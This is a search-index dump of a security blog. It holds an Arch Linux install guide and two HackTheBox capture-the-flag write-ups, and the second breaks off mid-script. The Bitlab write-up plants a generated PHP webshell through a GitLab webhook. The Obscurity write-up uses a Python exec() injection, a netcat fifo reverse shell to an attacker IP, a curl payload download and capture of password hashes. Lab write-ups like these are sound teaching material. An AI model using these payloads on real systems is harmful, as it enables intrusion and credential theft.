[{"title":"About","href":"/about","content":" whoami hg8 Information Security Researcher CTF Enthusiast Bug Hunter Hi there my name is hg8 I am Information Security Researcher and CTF enthusiast I set up this website to keep notes of my various work and especially CTF writeups Im writing all of this down for mainly three purposes Share it with you Systematize it for future reference and improvement Learn from your feedback Your questions and observations are very welcome Feel free to drop me a message on twitter hg8httpstwittercomhg8 or to my email hello at hg8 dot sh Cheers "},{"title":"Arch Linux install on Huawei MateBook Pro X 2019","tags":["arch linux","linux","huawei","matebook x pro","guide"],"href":"/posts/arch-linux-huawei-matebook-x-pro-2019","content":"A few people asked me what was I using as my daily driver I have been using a Matebook X Pro 2019 since almost one year now with Arch Linux as main distro Super satisfied about it I have no complaints and its perfect for my daily workflow Here is a guide I wrote on how to install Arch Linux and fix the little things that dont work out of the box This guide describe how to make a full installation of Arch Linux on the Huawei MateBook Pro X 2019 with Full Disk Encryption For the record this was done with a new Huawei MateBook Pro X 2019 Intel Core i78565U 8GB RAM 512GB SSD Installation Update BIOS if possible Boot into Windows 10 once and let it go through its whole setup so you can update the BIOS Create an Arch Boot USB Key Download the Arch ISOhttpswwwarchlinuxorgdownload Burn it to a UBS KeyhttpswikiarchlinuxorgindexphpUSBflashinstallationmedia like so bash sudo dd bs4M ifpathtoarchlinuxiso ofdevsdx statusprogress oflagsync If on Windows you can use Rufushttprufusie which worked great everytime I used it Boot from USB To access the Boot menu first disable Secure Boot in the BIOS Enter with Secure Boot Disable Then hold down F2 while booting to enter the BIOS device selection and choose your Arch USB Make Fonts Readable Make the console font larger so its readable well set a permanent font later setfont latarcyrhebsun32 Connect to internet Most of this next part is from the Arch Install GuidehttpswikiarchlinuxorgindexphpInstallationguide wifimenu Check that it works it may take a few seconds for networking to come up ping archlinuxorg Update the system clock timedatectl setntp true Partition and Format This install will use full disk encryption with the exception of the EFI boot partition bash gdisk devnvme0n1 bash GPT fdisk gdisk version 101 Command for help o This option deletes all partitions and creates a new protective MBR Proceed YN Y Command for help n Partition number 1128 default 1 First sector 34242187466 default 2048 or sizeKMGTP Last sector 2048242187466 default 242187466 or sizeKMGTP 512M Current type is Linux filesystem Hex code or GUID L to show codes Enter 8300 EF00 Changed type of partition to EFI System Command for help n Partition number 2128 default 2 First sector 34242187466 default 1050624 or sizeKMGTP Last sector 1050624242187466 default 242187466 or sizeKMGTP Current type is Linux filesystem Hex code or GUID L to show codes Enter 8300 Changed type of partition to Linux filesystem Command for help p Disk devsda 242187500 sectors 1155 GiB Logical sector size 512 bytes Disk identifier GUID 9FB9AC2C8F2941AE8D6121EA9E0B4C2A Partition table holds up to 128 entries First usable sector is 34 last usable sector is 242187466 Partitions will be aligned on 2048sector boundaries Total free space is 2014 sectors 10070 KiB Number Start sector End sector Size Code Name 1 2048 1050623 5120 MiB EF00 EFI System 2 1050624 242187466 1150 GiB 8300 Linux filesystem Command for help w Setup Disk Encryption I chose the relatively simple LVM on LUKS setup combining instructions from EncryptinganentiresystemhttpswikiarchlinuxorgindexphpDmcryptEncryptinganentiresystemLVMonLUKS There will be a single LUKS2 volume with LVM on top LVM will then divide that volume into root home and swap Setup and open the LUKS2 volume cryptsetup luksFormat type luks2 devnvme0n1p2 cryptsetup open devnvme0n1p2 S3V0 Setup LVM with swap at least as large as RAM to support hibernate pvcreate devmapperS3V0 vgcreate archvg devmapperS3V0 lvcreate L 16G S3V0 n swap lvcreate L 64G S3V0 n root lvcreate l 100FREE S3V0 n home Format the filesystems mkfsvfat F32 devnvme0n1p1 mkfsext4 devS3V0root mkfsext4 devS3V0home mkswap devS3V0swap Mount the partitions mount devS3V0root mnt mkdir mnthome mount devS3V0home mnthome swapon devS3V0swap Mount the bootESP volume mkdir mntboot mount devnvme0n1p1 mntboot Install the base system pacstrap mnt base basedevel Generate the fstab genfstab U mnt mntetcfstab Basic Configuration This is mostly straight from the Arch Wiki Installation GuidehttpswikiarchlinuxorgindexphpInstallationguide Chroot to the new arch install archchroot mnt Set the timezone and hwclock ln sf usrsharezoneinfoAmericaLosAngeles etclocaltime hwclock systohc Setup Locales uncomment any needed in etclocalegen and generate them localegen echo LANGenUSUTF8 etclocaleconf Set a hostname echo marchbook etchostname Make the system bootable Install Intel Microcode Updates this will install an initrd image that we add to our boot loader config pacman S intelucode Next setup systemdboot bootctl pathboot install Get the encrypted volume UUID for use in the systemdboot config blkid devnvme0n1p2 Add a menu entry for Arch and configure the loader vim bootloaderloaderconf bash timeout 0 default arch entries 0 vim bootloaderentriesarchconf bash title Arch Linux linux vmlinuzlinux initrd initramfslinuximg options cryptdeviceUUIDlvmallowdiscards resumedevmapperS3V0swap rootdevmapperS3V0root initrdintelucodeimg rw Add the keyboard encrypt and lvm2 hooks to etcmkinitcpioconf bash HOOKSbase udev autodetect keyboard keymap consolefont modconf block encrypt lvm2 filesystems fsck Then setup KMS Kernel Mode Setting KMS is a method for setting display resolution and depth in the kernel space rather than user space Arch Linux WikihttpswikiarchlinuxorgindexphpKernelmodesetting bash MODULES i915 Regenerate initramfs mkinitcpio p linux Install some packages so wifimenu works after reboot pacman S dialog wpasupplicant Set the root password passwd Reboot exit reboot Post Install Configuration Connect to internet Get wifi back online after first boot wifimenu Get networking to come up automatically with netctl systemctl enable netctlautowlp0s20f3service netctl profiles will be startedstopped automatically as you move from the range of one network into the range of another network roaming Create a regular user useradd G wheel m hugo passwd hugo Then log out and switch to that user Setup power saving Enable TLP for powersaving pacman S tlp tlprdw systemctl enable tlpservice systemctl enable tlpsleepservice systemctl mask systemdrfkillservice systemctl mask systemdrfkillsocket Install ethtool lsbrelease and smartmontools following the suggestion of tlpstat pacman S ethtool lsbrelease smartmontools Get X11 Working This configuration is fitted to me update it according to your needs Install X11 bspwm and a few other nice things pacman S bspwm sxhkd nvidia xorgserver xorgfontutil xorgfonts75dpi xorgfonts100dpi xorgmkfontdir xorgmkfontscale xorgxdpyinfo xorgxrandr xorgxset bumblebee bbswitch termite firefox mesa xf86videointel xbindkeys xorgxmodmap xorgxrdb Enable Bumblebee with bbswitch for Nvidia Intel switching systemctl enable bumblebeedservice gpasswd a USER bumblebee Other useful app Few apps I need pacman S zsh vim git compton xorgxinit pythonpip python2 light openssh pass polybar rofi randr xorgxsetroot feh notofontscjk arcgtktheme thunar lxappearance vlc gvfs thunararchiveplugin thunarvolman tumbler rawthumbnailer gvfsmtp gpicview xorgxkill exa bat xsslock xautolock autocutsel dunst ncdu chromium unzip zip p7zip pacmancontrib tldr xdguserdirs scrot xclip blueman Setup my dot files Install my dotfiles setup githubcomhg8dotfileshttpsgithubcomhg8dotfiles hg8 dotfilehttpsgithubcomhg8dotfilesrawmasterscreenshot201904171633393200x1800scrotpng Install a AUR Helper Install trizen to build packages from Arch AUR bash git clone httpsaurarchlinuxorgtrizengit cd trizen makepkg si Automatic startx at user login Edit your profile zprofile for zsh users with bash cat zprofile if DISPLAY XDGVTNR eq 1 then exec startx fi Make Pacman faster Sort the pacman mirrors by speed Arch Wiki Sorting MirrorshttpswikiarchlinuxorgindexphpmirrorsSortingmirrors Various configurations Setup the Linux Console font for HiDPi Set a readable console font pacman S terminusfont Create etcvconsoleconf with contents FONTter132n Setup user dirs Setup basic user directories Documents Pictures etc bash sudo pacman S xdguserdirs xdguserdirsupdate Configure the Trackpad Info from Linux with a Macbook Touchpad Feel Pt 2httpswilliambhardingcombloglinuxtomacbooklinuxwithamacbooktouchpadfeelpt2 Im using Synamptics based on the recommendations from the above link Here is how I configured it pacman S xf86inputsynaptics Then I created etcX11xorgconfd30synapticsconf with these contents bash Section InputClass Identifier touchpad catchall Driver synaptics MatchIsTouchpad on Enabling taptoclick is a perilous choice that begets needing to set up palm detectionignoring Since I am fine clicking my touchpad I sidestep the issue by disabling tapping Option TapButton1 0 Option TapButton2 0 Option TapButton3 0 Using negative values for ScrollDelta implements natural scroll a la Macbook default Option VertScrollDelta 80 Option HorizScrollDelta 80 httpswikiarchlinuxorgindexphpTouchpadSynaptics has a very buried note about this option tldr this defines right button to be rightmost 7 and bottommost 5 Option SoftButtonAreas 93 0 95 0 0 0 0 0 MatchDevicePath devinputevent EndSection Hibernate on Low Battery Suspend on low battery to etcudevrulesd99lowbatrules cat etcudevrulesd99lowbatrules Suspend the system when battery level drops to 5 or lower SUBSYSTEMpowersupply ATTRstatusDischarging ATTRcapacity05 RUNusrbinsystemctl suspend Time Sync Setup time sync Arch Wiki SystemdtimesyncdhttpswikiarchlinuxorgindexphpSystemdtimesyncd Edit etcsystemdtimesyncdconf uncomment these lines NTP0archpoolntporg 1archpoolntporg 2archpoolntporg 3archpoolntporg FallbackNTP0poolntporg 1poolntporg 0uspoolntporg Then start it timedatectl setntp true Fixes 40 Surround Speakers To fix Huawei Matebook X Pro Speakers on Linux follow this guidehttpsgithubcomhg8archmatebookxpro2019blobmasterguidefixmatebookxprospeakerslinuxmd Volume and Screen Brightness Buttons Work Instructions generally came from Arch Wiki XbindkeyshttpswikiarchlinuxorgindexphpXbindkeys To set the backlight we need light pacman S light Well need xbindkeys pacman S xbindkeys xbindkeys d xbindkeysrc Here is an example on how to use it bash XF86AudioRaiseVolume pactl setsinkvolume DEFAULTSINK 1000 XF86AudioLowerVolume pactl setsinkvolume DEFAULTSINK 1000 XF86AudioMute pactl setsinkmute DEFAULTSINK toggle XF86MonBrightnessUp light A 10 XF86MonBrightnessDown light U 10 You can also use my script brightnesshttpsgithubcomhg8dotfilesblobmasterbinbrightness and volumehttpsgithubcomhg8dotfilesblobmasterbinvolume to show notifications on volume and brightness change using dunst 20190522082913373x102scrothttpsuserimagesgithubusercontentcom907674758159341cf227e807c6b11e990b059f394ac3e93png 20190522082926356x102scrothttpsuserimagesgithubusercontentcom907674758159343cfbb15007c6b11e99aad7d8ba1d858b9png Maintenance BIOS Updates Huawei provides downloadable BIOS updates packaged for Windows With some effort these can be installed from Linux The following method is availablehttpsgithubcomnekr0zlinuxonhuaweimatebook132019biosupdates Note that it would maybe be safer no messing up with UEFI boot record to use a Win2Go USB key to update BIOS Will report after my personal tries"},{"title":"Bitlab - HackTheBox","tags":["hackthebox","ctf","bitlab","obfuscation","webshell","git","gitlab"],"href":"/posts/bitlab","content":"Bitlab box was an interesting box user part was typical reallife scenario actually meet this scenario during a pentest while the root part was my first time Reverse Engineering dflsd First we add the box ip to our hosts file and lets start bash hg8archbook echo 101010114 bitlabhtb etchosts User flag Lets start with the classic nmap scan bash nmap sV sT sC bitlabhtb Starting Nmap 780 httpsnmaporg at 20191026 0200 CEST PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http nginx httprobotstxt 55 disallowed entries 15 shown Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 9645 seconds We have a classical web app running on port 443 and the ssh port 22 open Opening httpbitlabhtb display the following a gitlab instance 201910262152131531x1034scrothttpsuserimagesgithubusercontentcom90767476762518725eb4000f82a11e981e92541d037031epng Using gobuster to brute force for interesting directories and files wont be useful here since all urls return a redirect to the login page We will do the old fashioned way of manual browsing Explore page is empty while Help show a directory listing and a bookmarkshtml page Opening this page display what looks like the exported bookmarks of the developer The Gitlab Sign In bookmark looks odd html Gitlab Login The bookmark is not a url but javascript script This is a useful trick that allow to run javascript on a given website just by clicking on the bookmark icon Since the js is obfuscated lets open the Gitlab login page and run it onto the console to see what happen 201910262205161455x1348scrothttpsuserimagesgithubusercontentcom907674767625306f6d5ce00f82b11e984b87a47c3ba733bpng The js script is automatically filling the login form with username clave and a password While checking network we can see that the password is 11des0081x So we have access to one developer Gitlab account Out of curiosity I tried to ssh with those credentials but without surprise it didnt worked Lets move on We have access to two repositories Deployer Profile Seeing by the name we can guess that deployer will be a kind of script to automatically deploy application to the web server Lets try to understand the inner working better deployer repository hold a single indexphp file The README file explain that its a webhook Reading through the documentation of gitlabhttpsdocsgitlabcomeeuserprojectintegrationswebhookshtml we can understand that a webhook is a function that will call a given url when a event occur on the repository In our case here we can guess that the repository is configured to call httpbitlabhtbdeployerindexphp when a action is made on the repository can be commit merge pull request etc Lets take a look at the indexphp to understand what action is made once its called php projectname event payloadeventtype state payloadobjectattributesstate branch payloadobjectattributestargetbranch if repoProfile branchmaster eventmergerequest statemerged echo shellexeccd profile sudo git pulln echo OKn This a rather simple script Judging from the if condition we understand that the script will cd into profile directory and then git pull to get the latest changes on every merged merge request Its our luck because we have control over the profile repository which is available through the Gitlab instance with our credentials That means that if we merge a file after amergerequest to the profile repository this said file will automatically be pulled on the server by the deployerindexphp webhook Thats the perfect scenario for a webshell dont you thin Through this Gitlab interface we can add a new file to our the profile repository it will be faster than cloning I used weevely to generate a php webshell bash hg8archbook python weevelypy generate htbpassword hg8php Generated hg8php with password htbpassword of 762 byte size hg8archbook cat hg8php php rkabc7377bkh3b25356491dakfbe00e7cb757bpw0NSnMMi Ajreturn oifpregmatchkhkffilegetconten Yrbase64encodexgzcompressokprintpkhrkf Gori0ilforj0jci After committing our new file to the repository we start a merge request and merge it ourselves since we have enough permissions to do so Our webshell is now in the profile repository 201910262230291281x515scrothttpsuserimagesgithubusercontentcom9076747676255677913c180f82f11e99a7854c020336a58png If the webhook worked properly our new file should already be on the server lets try it out bash hg8archbook python weevelypy httpbitlabhtbprofilehg8php htbpassword weevely id uid33wwwdata gid33wwwdata groups33wwwdata wwwdatabitlabvarwwwhtmlprofile We are in as user wwwdata Pivot wwwdata clave user Lets do some recon to get the user flag bash wwwdatabitlab ls l home total 4 drwxrxrx 4 clave clave 4096 Aug 8 1440 clave wwwdatabitlab ls l homeclave total 20 r 1 clave clave 13824 Jul 30 1958 RemoteConnectionexe r 1 clave clave 33 Feb 28 2019 usertxt The user is clave as well Of course we dont have enough permissions to read the flag After a bit of recon time it seems that nothing helpful seems to be accessible from wwwdata user When nothing can be found a good strategy is to look back at our entry point to make sure we didnt forgot anything Lets go back to our starting point Gitlab After searching around and digging a bit more we can find a Snippet page under each users profile On the Developer profile there is a Postgresql snippet with hardcoded credentials php php dbconnection pgconnecthostlocalhost dbnameprofiles userprofiles passwordprofiles result pgquerydbconnection SELECT FROM profiles Lets try to dig into the database for useful informations bash wwwdatabitlab psql profiles profiles sh 1 psql not found Since psql is not installed lets use the postgresql PHP library I tweaked up the snippet a little to obtain the following scrip php Array id 1 username clave password c3NoLXN0cjBuZy1wQHNz Decoding the password gives the following bash hg8archbook echo c3NoLXN0cjBuZy1wQHNz base64 di sshstr0ngpss Awesome we got the ssh password for user clave lets go for the user flag bash hg8archbook ssh clavebitlabhtb clavebitlabhtbs password Permission denied please try again Permission denied thats disappointing and strange The database entry clearly state the user is clave we saw previously that no other user are present on the box The password itself state ssh Could it be that it was simply the cleartext password bash hg8archbook ssh clavebitlabhtb clavebitlabhtbs password Last login Sun Oct 27 142651 2019 from 10101010 clavebitlab cat usertxt 1e3fxxxxxxxxxxxxxxxxb8154 That was it it was easy to loose time on this one but the password was c3NoLXN0cjBuZy1wQHNz without decoding Lets move to root Root Flag Recon The recon part was quite quick a Windows executable named RemoteConnectionexe was present on the home folder Lets pull it and start the analysis bash hg8archbook scp clavebitlabhtbRemoteConnectionexe clavebitlabhtbs password RemoteConnectionexe 100 14KB 2795KBs 0000 "},{"title":"Obscurity- HackTheBox","tags":["hackthebox","ctf","obscurity","python","custom-exploitation","encryption","re","john"],"href":"/posts/book","content":"Just finished the newly released Obscurity box on Hackthbox I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection a little crypto and misconfigurations I wouldnt say its an easy one but its a pretty good one for developers comfortable with Python and want to level up in CTF TlDr The user flag consisted in grabbing the source code of the server running port 80 reverse engineer it to find a command injection flaw in its workflow From there you achieve remote code execution as wwwdata As wwwdata you can access Robert user home directory filed with a encrypted password reminder file and a homemade python encryption script Reversing this script you can recover the password used to encrypt the password reminder file Once decrypted you use this password in the file to pivot to Robert user and grab the flag The root flag was accessible by abusing another homemade python script used to get a shell as root when reverse engineer it you discover the script temporary store all users password hashes to the tmp folder when running but immediately deletes them You can write a script to grab the hashes fast enough before they get deleted crack the hash of root and connect with the root account to grab the flag Alright Lets get into the details now First thing first lets add the box IP to the host file bash hg8archbook echo 101010168 obscurityhtb etchosts and lets start User Flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash nmap sV sT sC obscurityhtb Starting Nmap 780 httpsnmaporg at 20191226 0956 CET Nmap scan report for obscurityhtb 101010168 Host is up 0038s latency Not shown 996 filtered ports PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp closed http 8080tcp open httpproxy BadHTTPServer 9000tcp closed cslistener Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 1609 seconds Bit less classic than usual port 80 is closed nmap return 9000 port which is closed no idea what this is so we keep it in mind for later maybe The ssh port 22 is open and the 8080 one running BadHTTPServer Intriguing Lets dig it on this bad server Opening httpobsurityhtb8080 display the following website obscurityhttpsuserimagesgithubusercontentcom907674771549328fee0f40029bb11ea9df781ea1b4d4ae6png Looking around we notice this interesting message Message to server devs the current source code for the web server is in SuperSecureServerpy in the secret development directory Well since we dont have other entry point yet lets try to bruteforce our way to find this secret directory name This time I decided to give ffufhttpsgithubcomffufffuf a fast web fuzzer written in Go a try Its usage is pretty straightforward and similar to wfuzz bash hg8archbook ffuf w SecListsDiscoveryWebContentbigtxt u httpobscurityhtb8080FUZZSuperSecureServerpy v10rc1 Method GET URL httpobscurityhtb8080FUZZSuperSecureServerpy develop Status 200 Size 5892 Words 1806 Lines 171 Progress 2047020470 222 reqsec Duration 00132 Errors 0 Got it The secret directory was develop Lets open this SuperSecureServerpy to take a look import socket import threading from datetime import datetime import sys import os import mimetypes import urllibparse import subprocess respTemplate HTTP11 statusNum statusCode Date dateSent Server server LastModified modified ContentLength length ContentType contentType Connection connectionType body DOCROOT DocRoot CODES 200 OK 304 NOT MODIFIED 400 BAD REQUEST 401 UNAUTHORIZED 403 FORBIDDEN 404 NOT FOUND 500 INTERNAL SERVER ERROR MIMES txt textplain csstextcss htmltexthtml png imagepng jpgimagejpg ttfapplicationoctetstreamotfapplicationoctetstream wofffontwoff woff2 fontwoff2 jsapplicationjavascriptgzapplicationzip pytextplain map applicationoctetstream class Response def initself kwargs selfdictupdatekwargs now datetimenow selfdateSent selfmodified nowstrftimea d b Y HMS def stringResponseself return respTemplateformatselfdict class Request def initself request selfgood True try request selfparseRequestrequest selfmethod requestmethod selfdoc requestdoc selfvers requestvers selfheader requestheader selfbody requestbody except selfgood False def parseRequestself request req requeststriprsplitn methoddocvers req0split header req13 body req1 headerDict for param in header pos paramfind key val parampos parampos2 headerDictupdatekey val return method method doc doc vers vers header headerDict body body class Server def initself host port selfhost host selfport port selfsock socketsocketsocketAFINET socketSOCKSTREAM selfsocksetsockoptsocketSOLSOCKET socketSOREUSEADDR 1 selfsockbindselfhost selfport def listenself selfsocklisten5 while True client address selfsockaccept clientsettimeout60 threadingThreadtarget selflistenToClientargs clientaddressstart def listenToClientself client address size 1024 while True try data clientrecvsize if data Set the response to echo back the recieved data req Requestdatadecode selfhandleRequestreq client address clientshutdown clientclose else raise errorClient disconnected except clientclose return False def handleRequestself request conn address if requestgood try printstrrequestmethod strrequestdoc end printfrom 0formataddress0 except Exception as e printe document selfserveDocrequestdoc DOCROOT statusNumdocumentstatus else document selfserveDocerrors400html DOCROOT statusNum400 body documentbody statusCodeCODESstatusNum dateSent server BadHTTPServer modified length lenbody contentType documentmime Try and identify MIME type from string connectionType Closed resp Response statusNumstatusNum statusCodestatusCode dateSent dateSent server server modified modified length length contentType contentType connectionType connectionType body body data respstringResponse if not data return 1 connsenddataencode return 0 def serveDocself path docRoot path urllibparseunquotepath try info output Document Keep the output for later debug execinfoformatpath This is how you do string formatting right cwd ospathdirnameospathrealpathfile docRoot ospathjoincwd docRoot if path path indexhtml requested ospathjoindocRoot path1 if ospathisfilerequested mime mimetypesguesstyperequested mime mime if mime0 None else texthtml mime MIMESrequestedsplit1 try with openrequested r as f data fread except with openrequested rb as f data fread status 200 else errorPage ospathjoindocRoot errors 404html mime texthtml with openerrorPage r as f data freadformatpath status 404 except Exception as e printe errorPage ospathjoindocRoot errors 500html mime texthtml with openerrorPage r as f data fread status 500 return body data mime mime status status The source code is worth reading taking a bit of time to understand give some really interesting insight on the working of this http server Remote Code Execution wwwdata shell If you are used to python development and ctf a line should quickly catch your eye execinfoformatpath As a reminded exechttpsdocspythonorg3libraryfunctionshtmlexec dynamically execute Python code passed as argument Like eval its usage is dangeroushttpsnedbatcheldercomblog201206evalreallyisdangeroushtml and open door to injections Lets see if we can use this flow to achieve remote code execution on the server Can we inject code in info variable info output Document Nope path then def parseRequestself request req requeststriprsplitn methoddocvers req0split def handleRequestself request conn address if requestgood document selfserveDocrequestdoc DOCROOT def serveDocself path docRoot path urllibparseunquotepath As we could have have guess path contains the url requested to the server and good news for us no sanitization is being made In the same way as SQL injection lets try to inject Python code that will lead to remote code injection on the server Lets create a simplified script to do so with information we have import os path inputCommand to execute info output Document printinfoformatpath So lets see what would happen if we pass an os command as path Lets try with ossystemsleep 5 bash hg8archbook python injectionpy Command to execute ossystemsleep 5 output Document ossystemsleep 5 This is not going to work we will need to escape the python command lets give it another try bash hg8archbook python injectionpy Command to execute ossystemsleep 5 output Document ossystemsleep 5 Looks good to me and doesnt throw error lets add the same exec than in the original to make sure the injection will work properly against the server import os path ossystemsleep 5 info output Document execinfoformatpath And lets run it if it hang for 5 seconds then it mean our injection was successful bash hg8archbook time python injectionpy python tmppy 002s user 001s system 0 cpu 5029 total It worked perfectly Lets now gather everything we know to achieve remote code execution on the server import os import requests url httpobscurityhtb8080ossystem while True cmd inputCommand to execute r requestsgeturlformatcmd We will try to execute a reserve shell After having no luck getting the classical netcat nor python reverse shell to work which is strange since we know python is running on the box I managed to get the fifo netcathttpswwwgnucitizenorgblogreverseshellwithbashcomment127498 reverse shell to work bash hg8archbook cat hg8sh rm tmphmkfifo tmphcat tmphbinsh i 21nc 10101010 8585 tmph hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 Then we open our listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 And finally we send our payload bash hg8archbook python rcepy Command to execute curl 101010108000hg8sh o tmphg8sh Command to execute bash tmphg8sh Aand we get the connection bash hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 10101016843378 id uid33wwwdata gid33wwwdata groups33wwwdata Note Looking around we immediately notice that the python bin used is pyhton3 thats why the common python shell wasnt working As usual its easy to overlook simple blockers like this one Pivot wwwdata Robert Quick recon shows that the user is robert and have a few interesting files we can read bash wwwdataobscure ls l homerobert ls l homerobert total 24 drwxrxrx 2 root root 4096 Dec 2 0947 BetterSSH rwrwr 1 robert robert 94 Sep 26 2308 checktxt rwrwr 1 robert robert 185 Oct 4 1501 outtxt rwrwr 1 robert robert 27 Oct 4 1501 passwordremindertxt rwxrwxrx 1 robert robert 2514 Oct 4 1455 SuperSecureCryptpy rwx 1 robert robert 33 Sep 25 1412 usertxt passwordremindertxt sure looks interesting Lets check it out bash wwwdataobscurehomerobert cat passwordremindertxt k Its encrypted What else do we have Lets see for checktxt and outtxt bash wwwdataobscurehomerobert cat checktxt Encrypting this file with your key should result in outtxt make sure your key is correct wwwdataobscurehomerobert cat outtxt v Thats interesting checktxt explain that encrypting this same file will result in outtxt with a given key We have both clear text message and its encrypted version Something also catch my eye Did you notice that the encrypted version contain the same number of characters and the same spaces placement than the clear text one We can say with confidence that the encryption mechanism seems to simply encrypt each letter one by one using the key somehow Lets see if we can find more informations and possibly retrieve the key If we find the key we can decipher the passwordremindertxt that will allow us to progress We didnt take a look at SuperSecureCryptpy its easy to guess that its the script used to encrypt those file This is the script import sys import argparse def encrypttext key keylen lenkey keyPos 0 encrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 encrypted newChr keyPos 1 keyPos keyPos keylen return encrypted def decrypttext key keylen lenkey keyPos 0 decrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 decrypted newChr keyPos 1 keyPos keyPos keylen return decrypted parser argparseArgumentParserdescriptionEncrypt with 0bscuras encryption algorithm parseraddargumenti metavarInFile typestr helpThe file to read requiredFalse parseraddargumento metavarOutFile typestr helpWhere to output the encrypteddecrypted file requiredFalse parseraddargumentk metavarKey typestr helpKey to use requiredFalse parseraddargumentd actionstoretrue helpDecrypt mode args parserparseargs banner n banner BEGINNING n banner SUPER SECURE ENCRYPTOR n banner n banner n banner FILE MODE n banner printbanner if argso None or argsk None or argsi None printMissing args else if argsd printOpening file 0formatargsi with openargsi r encodingUTF8 as f data fread printDecrypting decrypted decryptdata argsk printWriting to 0formatargso with openargso w encodingUTF8 as f fwritedecrypted else printOpening file 0formatargsi with openargsi r encodingUTF8 as f data fread printEncrypting encrypted encryptdata argsk printWriting to 0formatargso with openargso w encodingUTF8 as f fwriteencrypted Lets break it down to better understand how it works parser argparseArgumentParserdescriptionEncrypt with 0bscuras encryption algorithm parseraddargumenti metavarInFile typestr helpThe file to read requiredFalse parseraddargumento metavarOutFile typestr helpWhere to output the encrypteddecrypted file requiredFalse parseraddargumentk metavarKey typestr helpKey to use requiredFalse Reading the argparse we can quickly understand whats this script will encrypt and decrypt a given file using a given key The function that interesting us is the encrypt function Why is it interesting Because we have a clear text file and its encrypted version checktxt and outtxt The encrypt function looks like this def encrypttext key keylen lenkey keyPos 0 encrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 encrypted newChr keyPos 1 keyPos keyPos keylen return encrypted 12 lines taking it step by step we should have a good understanding of what it is doing Lets start The function take 2 arguments the text to encrypt and the secret key Nothing surprising yet Second third and fourth line respectively get the length of the key initialize keyPos to 0 which we can understand means key position and initialize the encrypted variable that will for sure hold the final encrypted content since its returned at the end of the function The for loop every character of the content to encrypt this seems to confirm our previous assumption that the content is encrypted letterbyletter Inside the for loop the encrypt mechanism takes place keyChr keykeyPos get the secret key letter position For example if the secret password is hg8 then at the first loop keyChr will be h second loop it will be g and third loop 8 since keyPos get incremented by one at the end of the loop Then ord function is used on the letter to encrypt Python documentationhttpsdocspythonorg3libraryfunctionshtmlord explain Given a string representing one Unicode character return an integer representing the Unicode code point of that character For example orda returns the integer 97 and ord Euro sign returns 8364 This is the inverse of chrhttpsdocspythonorg3libraryfunctionshtmlchr chr Next line is where the Magic happens Lets break it down 1 newChr ordkeyChr The integer unicode code of the character to encrypt gets added to the integer unicode code of the current key character 2 newChr ordkeyChr 255 gets the remainder from the division of the keyChr addition by 255 to make sure it doesnt not exceed the Unicode code list 3 Finally we convert the result integer of the operation back to string using chr The encrypted character then gets added to the final encrypted variable with encrypted newChr The last two lines increments the key position so that the next characters to be encrypted will be encrypted from the next character of the secret key and so on keyPos keyPos keylen will restart the key position once we are at the end of the key For example with hg8 as a key this is what will happen when keyPos is 3 python keyPos keyPos keylen keyPos 3 3 keyPos 0 keyPos will be 0 since 3 divided by 3 gets 0 as remainder Alright This seems pretty clear now and not very robust encryption I am not going to describe the decrypt function since its exactly the same but inverted Lets now focus on how from an encrypted string and its cleartext equivalent we can find back the secret key used Recovering the secret key Seeing the encrypt logic its easy to understand how to get back the key from an clear string and its encrypted equivalent Clear character Key Character Encrypted Character Key Character Encrypted Character Clear character With that in mind we are going to write a little script to recover the secret key used to encrypt checktxt to outtxt To start we will input both clear and encrypted value python clear Encrypting this file with your key should result in outtxt make sure your key is correct encrypted v Here you need to be careful when copy pasting because space of the encrypted version are not usual spaces and could mess up your script if you paste it as normal spaces Here is how it should looks like in vim for example httpsuserimagesgithubusercontentcom907674772752623f6e331003bc211ea92b6a025983eb467png Here is the final script I made def recoverkeyclear encrypt key positionclear 0 positionencrypt 0 for character in clear clearchar clearpositionclear encryptchar encryptpositionencrypt keychar chrordencryptchar ordclearchar key keychar positionclear 1 positionencrypt 1 return key clear Encrypting this file with your key should result in outtxt make sure your key is correct encrypt v key recoverkeyclear encrypt printkey Lets run it bash hg8archbook python getsecretkeypy alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich Looks good The key is repeating remember keyPos keyPos keylen but we can easily see its alexandrovich Lets try to use it to decrypt passwordremindertxt bash wwwdataobscurehomerobert python SuperSecureCryptpy i passwordremindertxt o passwordremindercleartxt k alexandrovich BEGINNING SUPER SECURE ENCRYPTOR FILE MODE Opening file passwordremindertxt Encrypting Writing to passwordremindercleartxt wwwdataobscurehomerobert cat passwordremindercleartxt SecThruObsFTW Lets try to login to Robert account with this password bash hg8archbook ssh robertobscurityhtb robertobscurityhtbs password Last login Wed Jan 22 145630 2020 from 1010149 robertobscure cat usertxt exxxxxxxxxxxxxxxxxxx7 Root Flag Recon One of the first thing I do when doing recon for root is checking the sudoer file for uncommon configuration bash sudo S l Matching Defaults entries for robert on obscure envreset mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinsnapbin User robert may run the following commands on obscure ALL NOPASSWD usrbinpython3 homerobertBetterSSHBetterSSHpy Interesting another homemade script And it can be run as sudo Sounds like a bad idea to me If we can find a flaw in this BetterSSHpy we will be able to escalate our privileges to root The python script is the following import sys import random string import os import time import crypt import traceback import subprocess path joinrandomchoicesstringasciiletters stringdigits k8 session user authenticated 0 try sessionuser inputEnter username passW inputEnter password with openetcshadow r as f data freadlines data psplit if in p else None for p in data passwords for x in data if not x None passwordsappendx passwordFile njoinnjoinp for p in passwords with opentmpSSHpath w as f fwritepasswordFile timesleep1 salt realPass for p in passwords if p0 sessionuser salt realPass p1split2 break if salt printInvalid user osremovetmpSSHpath sysexit0 salt 6salt realPass salt realPass hash cryptcryptpassW salt if hash realPass printAuthed sessionauthenticated 1 